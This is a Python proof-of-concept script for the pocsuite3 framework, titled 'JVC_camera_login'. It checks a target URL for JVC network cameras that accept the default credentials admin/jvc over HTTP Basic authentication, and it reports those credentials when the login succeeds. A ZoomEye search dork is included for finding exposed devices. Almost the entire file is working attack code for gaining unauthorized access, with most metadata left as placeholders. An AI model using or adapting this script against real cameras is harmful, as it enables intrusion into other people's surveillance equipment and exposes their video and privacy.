#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
     POCBase, register_poc, requests, logger,
    OptString,
    random_str,
)
import base64



class DemoPOC(POCBase):
    vulID = 'xxx'
    version = '1'
    author = 'xxx'
    vulDate = '2023-03-20'
    createDate = '2023-03-20'
    updateDate = '2023-03-20'
    references = ['xxx']
    name = 'JVC_camera_login'
    appPowerLink = 'xxx'
    appName = 'xxx'
    appVersion = 'xxx'
    vulType = 'Login Bypass'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'JVC'}
    suricata_request = ''
    suricata_response = ''


    def _exploit(self, param=''):


        creds = {'Username':'admin','password':'jvc'}
        str_encode = str.encode(creds['Username'] + ':' + creds['password'])
        b64_login = str(base64.b64encode(str_encode),'utf-8')
        #payload = login_info
        payload = {'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Authorization': f'Basic {b64_login}'
            }

        res = requests.get(self.url,headers=payload)
        if res.status_code == 200 and 'JVC' in res.headers['Server']:
            return creds

    def _verify(self):
        result = {}
        param = ''
        res = self._exploit(param)
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)


if __name__ == '__main__':
    import os

    os.environ.setdefault('http_proxy', 'http://127.0.0.1:10808')
    os.environ.setdefault('https_proxy', 'http://127.0.0.1:10808')
    u = "http://127.0.0.1:40001"
    exp = DemoPOC()
    exp.set_option("url", u)
    exp.execute(mode='verify')
